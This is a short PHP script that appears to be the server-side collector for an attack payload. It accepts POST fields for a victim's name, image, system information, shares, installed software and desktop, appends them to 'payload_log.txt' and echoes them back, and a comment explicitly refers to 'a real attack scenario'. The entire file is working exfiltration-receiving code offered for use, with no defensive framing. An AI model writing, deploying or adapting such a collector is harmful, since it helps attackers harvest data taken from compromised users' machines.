<?php
// Capture the incoming POST data
$name = isset($_POST['name']) ? $_POST['name'] : 'N/A';
$img = isset($_POST['img']) ? $_POST['img'] : 'N/A';
$sysinfo = isset($_POST['sysinfo']) ? $_POST['sysinfo'] : 'N/A';
$share = isset($_POST['share']) ? $_POST['share'] : 'N/A';
$install = isset($_POST['install']) ? $_POST['install'] : 'N/A';
$desktop = isset($_POST['desktop']) ? $_POST['desktop'] : 'N/A';

// Log the received data (you can also store this in a database or file for further analysis)
$logfile = 'payload_log.txt'; // Path to store log (ensure appropriate permissions)
$logData = "Name: $name\nImage: $img\nSysinfo: $sysinfo\nShare: $share\nInstall: $install\nDesktop: $desktop\n---\n";
file_put_contents($logfile, $logData, FILE_APPEND);

// Optional: Output received data for testing purposes (remove in a real attack scenario)
echo "Received data:\n";
echo "Name: $name\n";
echo "Image: $img\n";
echo "Sysinfo: $sysinfo\n";
echo "Share: $share\n";
echo "Install: $install\n";
echo "Desktop: $desktop\n";
?>
